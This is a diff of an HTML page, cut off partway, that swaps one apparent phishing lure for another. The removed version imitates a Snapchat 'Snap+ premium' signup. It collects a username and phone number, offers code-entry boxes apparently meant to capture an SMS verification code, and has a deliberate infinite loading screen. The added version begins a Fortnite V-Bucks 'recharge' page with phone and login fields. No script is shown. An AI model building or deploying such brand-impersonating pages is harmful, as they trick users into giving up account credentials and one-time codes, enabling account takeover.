@@ -1,1043 +1,913 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr-FR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>S'inscrire à Snap+</title>
-
-  <meta property="og:title" content="S'inscrire à Snap+">
-  <meta property="og:description" content="Inscrivez-vous à Snap+ pour accéder à des avantages premium et des fonctionnalités exclusives.">
-  <meta property="og:image" content="https://i.pinimg.com/1200x/e1/8e/e7/e18ee7a774a7b42f03ea74a6b64811bd.jpg">
-  <meta property="og:url" content="https://methodsnap.netlify.app/">
-  <meta property="og:type" content="website">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="S'inscrire à Snap+">
-  <meta name="twitter:description" content="Avantages premium exclusifs.">
-  <meta name="twitter:image" content="https://i.pinimg.com/1200x/e1/8e/e7/e18ee7a774a7b42f03ea74a6b64811bd.jpg">
-
-  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@600;700;800&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-  <style>
-    :root {
-      --y:   #ffcc00;
-      --yd:  #e6a800;
-      --yg:  rgba(255,204,0,0.18);
-      --ok:  #4ade80;
-      --bg:  #050508;
-      --card:rgba(11,11,18,0.97);
-      --inp: rgba(255,255,255,0.035);
-      --bd:  rgba(255,255,255,0.07);
-      --bdy: rgba(255,204,0,0.35);
-      --tx:  #f2f2f2;
-      --mu:  rgba(242,242,242,0.38);
-      --er:  #ff6b6b;
-      --f:   'Plus Jakarta Sans', sans-serif;
-      --fs:  'Syne', sans-serif;
-    }
-
-    *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
-
-    body {
-      font-family: var(--f);
-      background: var(--bg);
-      color: var(--tx);
-      min-height: 100dvh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      overflow-x: hidden;
-      padding: 1.4rem;
-      -webkit-tap-highlight-color: transparent;
-      position: relative;
-    }
-
-    #bgCanvas { position:fixed; inset:0; z-index:0; pointer-events:none; }
-
-    .grid-overlay {
-      position: fixed; inset:0; z-index:0; pointer-events:none;
-      background-image:
-        linear-gradient(rgba(255,204,0,0.022) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255,204,0,0.022) 1px, transparent 1px);
-      background-size: 55px 55px;
-      mask-image: radial-gradient(ellipse 100% 100% at 50% 50%, black 20%, transparent 80%);
-    }
-
-    .card {
-      position: relative; z-index: 2;
-      width: 100%; max-width: 480px;
-      background: var(--card);
-      border-radius: 28px;
-      padding: clamp(2rem,5.5vw,2.8rem) clamp(1.6rem,5vw,2.4rem);
-      border: 1px solid rgba(255,204,0,0.1);
-      box-shadow:
-        0 0 0 1px rgba(255,255,255,0.02) inset,
-        0 40px 100px rgba(0,0,0,0.85),
-        0 0 80px rgba(255,204,0,0.05);
-      backdrop-filter: blur(24px);
-      animation: cardIn 0.7s cubic-bezier(0.23,1,0.32,1) both;
-    }
-
-    .card::before {
-      content:'';
-      position:absolute; top:-1px; left:18%; right:18%; height:2px;
-      background: linear-gradient(90deg, transparent, var(--y), transparent);
-      border-radius:2px;
-    }
-
-    @keyframes cardIn {
-      from { opacity:0; transform: translateY(32px) scale(0.96); }
-      to   { opacity:1; transform: none; }
-    }
-
-    .logo-wrap {
-      display:flex; align-items:center; justify-content:center;
-      gap:14px; margin-bottom:1.8rem;
-    }
-
-    .ghost-wrap {
-      position:relative;
-      animation: floatBob 3s ease-in-out infinite;
-    }
-    @keyframes floatBob {
-      0%,100% { transform:translateY(0); }
-      50%      { transform:translateY(-7px); }
-    }
-
-    .ghost-bg {
-      width:56px; height:56px; border-radius:18px;
-      background: linear-gradient(145deg, #ffdd00, #ff9d00);
-      display:flex; align-items:center; justify-content:center;
-      font-size:1.8rem;
-      box-shadow: 0 12px 36px rgba(255,180,0,0.4), 0 0 0 1px rgba(255,255,255,0.1) inset;
-    }
-
-    .ghost-ring {
-      position:absolute; inset:-7px; border-radius:25px;
-      border:1.5px solid rgba(255,204,0,0.22);
-      animation: ringP 2.2s ease-in-out infinite;
-    }
-    .ghost-ring2 {
-      position:absolute; inset:-16px; border-radius:32px;
-      border:1px solid rgba(255,204,0,0.08);
-      animation: ringP 2.2s ease-in-out 0.6s infinite;
-    }
-    @keyframes ringP {
-      0%,100%{ opacity:1; transform:scale(1); }
-      50%    { opacity:.35; transform:scale(1.04); }
-    }
-
-    .logo-text-col { display:flex; flex-direction:column; gap:3px; }
-    .logo-name {
-      font-family:var(--fs); font-weight:800; font-size:1.35rem;
-      color:#fff; letter-spacing:.5px; line-height:1;
-    }
-    .logo-badge {
-      font-size:.62rem; font-weight:700; letter-spacing:2px;
-      text-transform:uppercase; padding:3px 9px; border-radius:100px;
-      background: linear-gradient(135deg,#ffdd00,#ff9d00);
-      color:#000; width:fit-content;
-    }
-
-    .prog-wrap {
-      height:3px; background:rgba(255,255,255,0.05);
-      border-radius:10px; margin-bottom:1.8rem; overflow:hidden;
-    }
-    .prog-bar {
-      height:100%; border-radius:10px;
-      background: linear-gradient(90deg,#ffcc00,#ff9900);
-      transition: width .5s cubic-bezier(.4,0,.2,1);
-      box-shadow: 0 0 10px rgba(255,180,0,.5);
-    }
-
-    .steps {
-      display:flex; align-items:center; justify-content:center;
-      gap:0; margin-bottom:2rem;
-    }
-    .s-dot {
-      width:34px; height:34px; border-radius:50%;
-      background:rgba(255,255,255,0.04);
-      border:1.5px solid rgba(255,255,255,0.08);
-      display:flex; align-items:center; justify-content:center;
-      font-size:.78rem; font-weight:700; color:var(--mu);
-      transition:all .35s; flex-shrink:0;
-    }
-    .s-dot.active { background:var(--y); border-color:var(--y); color:#000; box-shadow:0 0 20px rgba(255,204,0,.5); }
-    .s-dot.done   { background:rgba(74,222,128,.12); border-color:rgba(74,222,128,.4); color:var(--ok); }
-    .s-line {
-      height:1.5px; width:44px; background:rgba(255,255,255,.07);
-      transition:background .4s; flex-shrink:0;
-    }
-    .s-line.done { background:rgba(74,222,128,.3); }
-
-    .st { font-family:var(--fs); font-weight:700; font-size:1.12rem; color:#fff; margin-bottom:4px; }
-    .ss { font-size:.82rem; color:var(--mu); margin-bottom:1.7rem; line-height:1.55; }
-
-    .field { margin-bottom:1.25rem; }
-
-    label {
-      display:block; font-size:.68rem; font-weight:600;
-      letter-spacing:1.6px; text-transform:uppercase;
-      color:var(--mu); margin-bottom:8px; transition:color .2s;
-    }
-    .field:focus-within > label { color:rgba(255,204,0,.8); }
-
-    input[type=text], input[type=tel] {
-      width:100%; padding:13px 16px;
-      border-radius:13px; border:1px solid var(--bd);
-      background:var(--inp); color:var(--tx);
-      font-family:var(--f); font-size:.95rem; outline:none;
-      transition:all .25s;
-    }
-    input[type=text]::placeholder,
-    input[type=tel]::placeholder { color:rgba(242,242,242,.15); }
-    input[type=text]:focus, input[type=tel]:focus {
-      border-color:var(--bdy);
-      background:rgba(255,204,0,.03);
-      box-shadow:0 0 0 3px rgba(255,204,0,.1);
-    }
-
-    .phone-wrap { display:flex; gap:8px; }
-    .phone-prefix {
-      padding:13px 13px; border-radius:13px;
-      border:1px solid var(--bd); background:var(--inp);
-      color:var(--tx); font-family:var(--f); font-size:.9rem;
-      display:flex; align-items:center; gap:6px;
-      white-space:nowrap; flex-shrink:0;
-    }
-    .phone-wrap input { flex:1; }
-
-    .d-pills { display:grid; grid-template-columns:repeat(3,1fr); gap:9px; margin-bottom:1.3rem; }
-    .d-pill {
-      padding:15px 8px; border-radius:14px;
-      border:1.5px solid var(--bd); background:var(--inp);
-      cursor:pointer; text-align:center; transition:all .22s;
-      position:relative; overflow:hidden;
-    }
-    .d-pill::before {
-      content:''; position:absolute; inset:0;
-      background:linear-gradient(135deg,rgba(255,204,0,.08),transparent);
-      opacity:0; transition:opacity .22s;
-    }
-    .d-pill:hover { border-color:rgba(255,204,0,.3); transform:translateY(-2px); }
-    .d-pill:hover::before { opacity:1; }
-    .d-pill.sel {
-      border-color:var(--y); background:rgba(255,204,0,.07);
-      box-shadow:0 0 22px rgba(255,204,0,.14);
-    }
-    .d-pill.sel::before { opacity:1; }
-    .d-pill .num { font-family:var(--fs); font-weight:800; font-size:1.3rem; color:#fff; }
-    .d-pill .lbl { font-size:.68rem; color:var(--mu); margin-top:2px; }
-    .d-pill .d-badge {
-      position:absolute; top:-1px; right:-1px;
-      font-size:.52rem; font-weight:700; letter-spacing:1px;
-      padding:3px 7px; border-radius:0 13px 0 8px;
-      background:var(--y); color:#000; text-transform:uppercase;
-    }
-    .d-pill.sel .num { color:var(--y); }
-
-    .err { font-size:.77rem; color:var(--er); margin-top:6px; min-height:16px; }
-
-    .info-row {
-      display:flex; align-items:center; gap:9px;
-      padding:10px 14px; border-radius:11px;
-      background:rgba(255,204,0,.04); border:1px solid rgba(255,204,0,.1);
-      margin-bottom:1.4rem;
-    }
-    .info-row .ii { font-size:.95rem; flex-shrink:0; }
-    .info-row p { font-size:.76rem; color:rgba(255,204,0,.65); line-height:1.4; }
-
-    .summary {
-      background:rgba(255,255,255,.025);
-      border:1px solid var(--bd); border-radius:14px;
-      padding:13px 16px; margin-bottom:1.4rem;
-      display:flex; flex-direction:column; gap:8px;
-    }
-    .sum-row { display:flex; justify-content:space-between; align-items:center; font-size:.82rem; }
-    .sum-key { color:var(--mu); }
-    .sum-val { color:#fff; font-weight:600; font-family:var(--fs); font-size:.86rem; }
-    .sum-val.y { color:var(--y); }
-
-    .btnw { display:flex; justify-content:center; margin-top:1.6rem; }
-    .btn {
-      padding:15px 44px; border-radius:999px; border:none;
-      background:linear-gradient(135deg,#ffdd00,#ffaa00);
-      color:#000; font-family:var(--f); font-size:.96rem; font-weight:700;
-      cursor:pointer; min-height:52px;
-      box-shadow:0 8px 28px rgba(255,180,0,.35), 0 0 0 1px rgba(255,255,255,.12) inset;
-      transition:all .3s cubic-bezier(.34,1.56,.64,1);
-      position:relative; overflow:hidden; letter-spacing:.2px;
-    }
-    .btn::after {
-      content:''; position:absolute; inset:0;
-      background:linear-gradient(135deg,rgba(255,255,255,.2),transparent);
-      opacity:0; transition:opacity .2s;
-    }
-    .btn:hover::after { opacity:1; }
-    .btn:hover:not(:disabled) { transform:translateY(-2px) scale(1.04); box-shadow:0 14px 36px rgba(255,180,0,.45); }
-    .btn:disabled { background:rgba(255,255,255,.07); color:var(--mu); box-shadow:none; cursor:not-allowed; transform:none; }
-
-    .codebox {
-      display:flex; justify-content:center;
-      gap:clamp(.55rem,3vw,.85rem); margin:1.6rem 0;
-    }
-    .codebox input {
-      width:clamp(54px,14vw,70px); height:clamp(64px,16vw,78px);
-      font-size:clamp(1.7rem,6vw,2.1rem); font-weight:700;
-      text-align:center; border-radius:15px;
-      border:1.5px solid var(--bd); background:var(--inp);
-      color:var(--y); padding:0; outline:none;
-      transition:all .22s; font-family:var(--fs);
-    }
-    .codebox input:focus {
-      border-color:var(--y);
-      box-shadow:0 0 0 3px rgba(255,204,0,.18), 0 0 24px rgba(255,204,0,.12);
-      transform:scale(1.07);
-    }
-    .codebox input.filled { border-color:rgba(255,204,0,.4); }
-
-    .resend {
-      text-align:center; margin-top:1.2rem;
-      font-size:.83rem; color:var(--mu);
-      cursor:pointer; transition:color .22s; user-select:none;
-    }
-    .resend:hover { color:var(--y); }
-
-    .sec-badge {
-      display:flex; align-items:center; justify-content:center;
-      gap:6px; margin-top:1.3rem;
-      font-size:.71rem; color:var(--mu);
-    }
-    .sec-badge .dot { width:6px; height:6px; border-radius:50%; background:var(--ok); }
-
-    .phone-confirm {
-      font-size:.81rem; color:var(--mu); text-align:center; margin-bottom:4px;
-    }
-    .phone-confirm strong { color:var(--y); font-weight:600; }
-
-    .success-wrap { text-align:center; padding:.5rem 0; }
-    .check-ring {
-      width:90px; height:90px; border-radius:50%;
-      border:2.5px solid var(--ok);
-      display:flex; align-items:center; justify-content:center;
-      font-size:2.2rem; margin:0 auto 1.8rem;
-      box-shadow:0 0 40px rgba(74,222,128,.28), 0 0 80px rgba(74,222,128,.1);
-      background:rgba(74,222,128,.05);
-      animation:popIn .7s cubic-bezier(.34,1.56,.64,1) both;
-    }
-    @keyframes popIn {
-      from { opacity:0; transform:scale(.3) rotate(-20deg); }
-      to   { opacity:1; transform:scale(1) rotate(0deg); }
-    }
-    .suc-title {
-      font-family:var(--fs); font-weight:800; font-size:1.7rem;
-      color:var(--ok); margin-bottom:8px;
-    }
-    .suc-sub {
-      font-size:.87rem; color:var(--mu); line-height:1.6;
-      max-width:320px; margin:0 auto 1.6rem;
-    }
-    .suc-perks { display:grid; grid-template-columns:1fr 1fr; gap:8px; text-align:left; }
-    .suc-perk {
-      display:flex; align-items:center; gap:8px;
-      padding:10px 12px; border-radius:11px;
-      background:rgba(74,222,128,.05); border:1px solid rgba(74,222,128,.14);
-      font-size:.79rem; color:rgba(74,222,128,.8);
-    }
-
-    .panel { animation:panIn .42s cubic-bezier(.23,1,.32,1) both; }
-    @keyframes panIn {
-      from { opacity:0; transform:translateX(18px) scale(.98); }
-      to   { opacity:1; transform:none; }
-    }
-
-    #admin-crown {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      z-index: 9999;
-      width: 58px;
-      height: 58px;
-      border-radius: 50%;
-      background: linear-gradient(145deg, rgba(40,40,55,0.95), rgba(20,20,35,0.95));
-      border: 2px solid rgba(255,204,0,0.25);
-      color: #ddd;
-      font-size: 1.8rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      backdrop-filter: blur(14px);
-      box-shadow: 0 6px 24px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.08);
-      transition: all 0.3s ease;
-      user-select: none;
-    }
-
-    #admin-crown:hover {
-      color: var(--y);
-      transform: scale(1.15) rotate(8deg);
-      box-shadow: 0 12px 40px rgba(255,204,0,0.3), inset 0 2px 0 rgba(255,255,255,0.12);
-    }
-
-    #admin-crown:active { transform: scale(0.96); }
-
-    #admin-crown.locked {
-      color: #555;
-      border-color: #444;
-      cursor: not-allowed;
-      transform: none;
-      opacity: 0.45;
-      box-shadow: none;
-    }
-
-    #admin-modal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.94);
-      z-index: 10000;
-      align-items: center;
-      justify-content: center;
-      backdrop-filter: blur(4px);
-    }
-
-    .modal-content {
-      background: linear-gradient(145deg, rgba(18,18,35,0.98), rgba(10,10,25,0.98));
-      border: 1px solid rgba(255,204,0,0.22);
-      border-radius: 24px;
-      padding: 2.4rem 2rem;
-      width: 92%;
-      max-width: 400px;
-      text-align: center;
-      box-shadow: 0 30px 100px rgba(0,0,0,0.9);
-    }
-
-    /* ─────────────────────────────────────────────── */
-    /*               ÉCRAN DE CHARGEMENT INFINI         */
-    /* ─────────────────────────────────────────────── */
-
-    #loading-screen {
-      position: fixed;
-      inset: 0;
-      background: var(--bg);
-      z-index: 99999;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: var(--tx);
-    }
-
-    .loader-container {
-      position: relative;
-      width: 140px;
-      height: 140px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .ghost-loader {
-      font-size: 5.8rem;
-      animation: ghostFloat 3.2s ease-in-out infinite;
-      z-index: 2;
-    }
-
-    @keyframes ghostFloat {
-      0%,100% { transform: translateY(0) rotate(0deg); }
-      50%     { transform: translateY(-18px) rotate(6deg); }
-    }
-
-    .ring-outer, .ring-middle, .ring-inner {
-      position: absolute;
-      border-radius: 50%;
-      border: 3px solid transparent;
-      animation: spin 2.4s linear infinite;
-    }
-
-    .ring-outer {
-      width: 140px;
-      height: 140px;
-      border-top-color: var(--y);
-      border-right-color: var(--y);
-      animation-duration: 2.8s;
-      animation-direction: normal;
-    }
-
-    .ring-middle {
-      width: 100px;
-      height: 100px;
-      border-top-color: #ffaa00;
-      border-left-color: #ffaa00;
-      animation-duration: 2.1s;
-      animation-direction: reverse;
-    }
-
-    .ring-inner {
-      width: 60px;
-      height: 60px;
-      border-top-color: var(--y);
-      border-bottom-color: var(--y);
-      animation-duration: 1.6s;
-    }
-
-    @keyframes spin {
-      0%   { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .loading-text {
-      margin-top: 2.8rem;
-      font-family: var(--fs);
-      font-weight: 800;
-      font-size: 1.6rem;
-      color: var(--y);
-      letter-spacing: 1.5px;
-      text-transform: uppercase;
-      text-shadow: 0 0 20px rgba(255,204,0,0.6);
-      animation: pulseText 2.2s ease-in-out infinite;
-    }
-
-    @keyframes pulseText {
-      0%,100% { opacity: 0.75; transform: scale(0.96); }
-      50%     { opacity: 1;    transform: scale(1.04); }
-    }
-
-    .loading-sub {
-      margin-top: 1rem;
-      font-size: 0.96rem;
-      color: var(--mu);
-      max-width: 280px;
-      text-align: center;
-      line-height: 1.5;
-    }
-
-    @media(max-width:480px){
-      .card { padding:1.6rem 1.4rem; border-radius:22px; }
-      #admin-crown { width:52px; height:52px; font-size:1.6rem; bottom:16px; right:16px; }
-      .ghost-loader { font-size: 4.8rem; }
-      .loader-container { width: 120px; height: 120px; }
-      .ring-outer { width:120px; height:120px; }
-      .ring-middle { width:86px; height:86px; }
-      .ring-inner  { width:52px; height:52px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>V-Bucks · Fortnite · Panier & Chat</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: #000000;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            color: #ffffff;
+            line-height: 1.4;
+            overflow-x: hidden;
+        }
+        .app {
+            max-width: 560px;
+            margin: 0 auto;
+            background: #0a0a0a;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 40px rgba(0,0,0,0.5);
+        }
+        /* header */
+        .header {
+            padding: 24px 20px 12px;
+            border-bottom: 1px solid #2c2c2c;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #000000;
+        }
+        .logo h1 {
+            font-size: 1.9rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, #aaa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo p {
+            font-size: 0.7rem;
+            color: #8f94a3;
+        }
+        .header-actions {
+            display: flex;
+            gap: 12px;
+        }
+        .icon-btn {
+            background: #1a1a1a;
+            border: none;
+            border-radius: 60px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        .cart-btn {
+            background: #1a1a1a;
+            border: none;
+            border-radius: 60px;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            color: white;
+            font-weight: 500;
+        }
+        .cart-badge {
+            background: white;
+            color: black;
+            border-radius: 40px;
+            padding: 2px 10px;
+            font-size: 0.75rem;
+            font-weight: bold;
+        }
+        /* formulaire */
+        .form-card {
+            padding: 20px 20px 8px;
+        }
+        .field {
+            margin-bottom: 20px;
+        }
+        label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #dbdbdb;
+        }
+        select, input {
+            width: 100%;
+            padding: 14px 18px;
+            background: #141414;
+            border: 1px solid #333;
+            border-radius: 28px;
+            font-size: 0.9rem;
+            color: white;
+            outline: none;
+        }
+        select:focus, input:focus {
+            border-color: #ffffff;
+        }
+        .vbuck-selector {
+            margin: 20px 0;
+        }
+        .vbuck-dropdown {
+            background: #141414;
+            border: 1px solid #333;
+            border-radius: 28px;
+            padding: 14px 18px;
+            width: 100%;
+            appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='18' height='18' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2'><polyline points='6 9 12 15 18 9'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 18px center;
+            cursor: pointer;
+        }
+        .add-btn {
+            background: #2a2a2a;
+            border: none;
+            padding: 12px;
+            border-radius: 60px;
+            color: white;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .phone-block {
+            margin: 16px 0;
+        }
+        .order-btn {
+            background: white;
+            color: black;
+            width: 100%;
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 1rem;
+            margin: 10px 0 20px;
+            cursor: pointer;
+        }
+        .error-msg {
+            color: #ff8a7a;
+            font-size: 0.7rem;
+            margin-top: 6px;
+        }
+        /* bottom nav */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            background: #050505;
+            border-top: 1px solid #222;
+            padding: 12px 16px 24px;
+            margin-top: 20px;
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            background: none;
+            border: none;
+            color: #9a9ea8;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .nav-item.active {
+            color: white;
+        }
+        .nav-item svg {
+            width: 22px;
+            height: 22px;
+            stroke: currentColor;
+            fill: none;
+        }
+        /* panier latéral */
+        .cart-panel {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            max-width: 480px;
+            width: 90%;
+            background: #0c0c0e;
+            z-index: 1000;
+            transform: translateX(100%);
+            transition: transform 0.25s ease-out;
+            box-shadow: -5px 0 30px rgba(0,0,0,0.8);
+            display: flex;
+            flex-direction: column;
+            border-left: 1px solid #2e2e2e;
+        }
+        .cart-panel.open {
+            transform: translateX(0);
+        }
+        .cart-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 20px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        .cart-header h2 {
+            font-size: 1.4rem;
+        }
+        .close-cart {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+        }
+        .cart-items-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+        }
+        .cart-item-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+            background: #151515;
+            padding: 12px 16px;
+            border-radius: 28px;
+        }
+        .cart-qty-control {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        .cart-qty-control button {
+            background: #2c2c2c;
+            border: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .remove-cart-item {
+            background: none;
+            border: none;
+            color: #ff6b6b;
+            font-size: 1.2rem;
+            margin-left: 12px;
+            cursor: pointer;
+        }
+        .cart-total {
+            padding: 20px;
+            border-top: 1px solid #2a2a2a;
+            text-align: right;
+            color: #aaa;
+        }
+        .empty-cart {
+            text-align: center;
+            color: #9aa0b0;
+            padding: 40px 0;
+        }
+        /* chat widget déplaçable */
+        .chat-widget {
+            position: fixed;
+            bottom: 80px;
+            left: 10px;
+            right: 10px;
+            max-width: 500px;
+            margin: 0 auto;
+            background: #121212;
+            border-radius: 32px;
+            border: 1px solid #3a3a3a;
+            z-index: 1200;
+            display: none;
+            flex-direction: column;
+            height: 540px;
+            box-shadow: 0 20px 35px black;
+            overflow: hidden;
+        }
+        .chat-widget.open {
+            display: flex;
+        }
+        .chat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px;
+            border-bottom: 1px solid #2a2a2a;
+            cursor: grab;
+            background: #0e0e0e;
+            border-radius: 32px 32px 0 0;
+        }
+        .chat-header:active {
+            cursor: grabbing;
+        }
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .message {
+            max-width: 80%;
+            padding: 8px 14px;
+            border-radius: 24px;
+            font-size: 0.8rem;
+            word-break: break-word;
+        }
+        .message.user {
+            background: #2c2e36;
+            align-self: flex-end;
+        }
+        .message.other {
+            background: #1f2a2f;
+            align-self: flex-start;
+            color: #ddd;
+        }
+        .message.system {
+            background: #2a2a2a;
+            align-self: center;
+            color: #ffaa44;
+            font-style: italic;
+            font-size: 0.75rem;
+            max-width: 90%;
+            text-align: center;
+        }
+        .message.embed {
+            background: #1e1e2a;
+            border-left: 4px solid #ffaa44;
+            max-width: 90%;
+            align-self: center;
+            width: 100%;
+        }
+        .embed-title {
+            font-weight: bold;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .embed-description {
+            font-size: 0.8rem;
+            color: #ccc;
+        }
+        .profile-preview {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+            align-items: center;
+        }
+        .profile-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: #ffaa44;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .profile-banner {
+            height: 60px;
+            background: linear-gradient(135deg, #3a3a4a, #1a1a2a);
+            border-radius: 12px;
+            margin-bottom: 8px;
+        }
+        .message-info {
+            font-size: 0.65rem;
+            color: #aaa;
+            margin-bottom: 4px;
+        }
+        .message-img {
+            max-width: 200px;
+            max-height: 200px;
+            border-radius: 16px;
+            margin-top: 6px;
+        }
+        .audio-message {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #2c2e36;
+            padding: 6px 12px;
+            border-radius: 40px;
+            width: fit-content;
+        }
+        .chat-input-area {
+            position: relative;
+            display: flex;
+            padding: 12px;
+            gap: 12px;
+            border-top: 1px solid #2a2a2a;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .chat-input-area input[type="text"] {
+            flex: 1;
+            background: #1e1e1e;
+            border: none;
+            border-radius: 60px;
+            padding: 12px 18px;
+            color: white;
+            user-select: text;
+        }
+        .action-btn {
+            background: white;
+            border: none;
+            border-radius: 60px;
+            padding: 0 18px;
+            font-weight: bold;
+            color: black;
+            cursor: pointer;
+            height: 44px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .recording-btn {
+            background: #aa2e2e;
+            color: white;
+        }
+        /* menu slash */
+        .slash-menu {
+            position: absolute;
+            bottom: 100%;
+            left: 12px;
+            background: #1e1e2a;
+            border-radius: 20px;
+            border: 1px solid #444;
+            overflow: hidden;
+            z-index: 1300;
+            width: 240px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            display: none;
+        }
+        .slash-menu-item {
+            padding: 10px 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            border-bottom: 1px solid #2a2a2a;
+            transition: 0.1s;
+        }
+        .slash-menu-item:hover {
+            background: #2c2c3a;
+        }
+        .slash-menu-item svg {
+            width: 18px;
+            height: 18px;
+            stroke: #ffaa44;
+        }
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 20px;
+            right: 20px;
+            background: #1f2a2f;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 60px;
+            text-align: center;
+            font-size: 0.8rem;
+            z-index: 1300;
+        }
+        /* modales */
+        .fullscreen-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.96);
+            backdrop-filter: blur(12px);
+            z-index: 1500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            padding: 32px;
+        }
+        .fullscreen-modal .modal-content {
+            max-width: 400px;
+            background: #121212;
+            padding: 32px;
+            border-radius: 48px;
+            border: 1px solid #333;
+        }
+        .fullscreen-modal input {
+            margin: 12px 0;
+        }
+        .fullscreen-modal button {
+            background: white;
+            color: black;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 60px;
+            margin-top: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .toggle-auth {
+            color: #ffaa44;
+            cursor: pointer;
+            margin-top: 12px;
+            font-size: 0.8rem;
+        }
+    </style>
 </head>
 <body>
-
-<canvas id="bgCanvas"></canvas>
-<div class="grid-overlay"></div>
-
-<div class="card" id="card">
-
-  <div class="logo-wrap">
-    <div class="ghost-wrap">
-      <div class="ghost-ring2"></div>
-      <div class="ghost-ring"></div>
-      <div class="ghost-bg">👻</div>
-    </div>
-    <div class="logo-text-col">
-      <span class="logo-name">Snapchat</span>
-      <span class="logo-badge">PREMIUM</span>
-    </div>
-  </div>
-
-  <div class="prog-wrap"><div class="prog-bar" id="progBar" style="width:33%"></div></div>
-
-  <div class="steps" id="stepDots">
-    <div class="s-dot active" id="dot1">1</div>
-    <div class="s-line" id="line1"></div>
-    <div class="s-dot" id="dot2">2</div>
-    <div class="s-line" id="line2"></div>
-    <div class="s-dot" id="dot3">3</div>
-  </div>
-
-  <div id="step1" class="panel">
-    <p class="st">Votre compte Snap</p>
-    <p class="ss">Entrez votre identifiant Snapchat et choisissez la durée de votre abonnement.</p>
-
-    <div class="field">
-      <label>Nom d'utilisateur Snapchat</label>
-      <input type="text" id="username" autocomplete="off" placeholder="ex: lyna.xx">
-    </div>
-
-    <div class="field">
-      <label>Durée de l'abonnement</label>
-      <div class="d-pills" id="dpills">
-        <div class="d-pill" data-val="1">
-          <div class="num">1</div><div class="lbl">mois</div>
+<div class="app">
+    <div class="header">
+        <div class="logo">
+            <h1>V-BUCKS</h1>
+            <p>Fortnite · recharge</p>
         </div>
-        <div class="d-pill" data-val="3">
-          <span class="d-badge">Populaire</span>
-          <div class="num">3</div><div class="lbl">mois</div>
+        <div class="header-actions">
+            <button id="infoModalBtn" class="icon-btn">
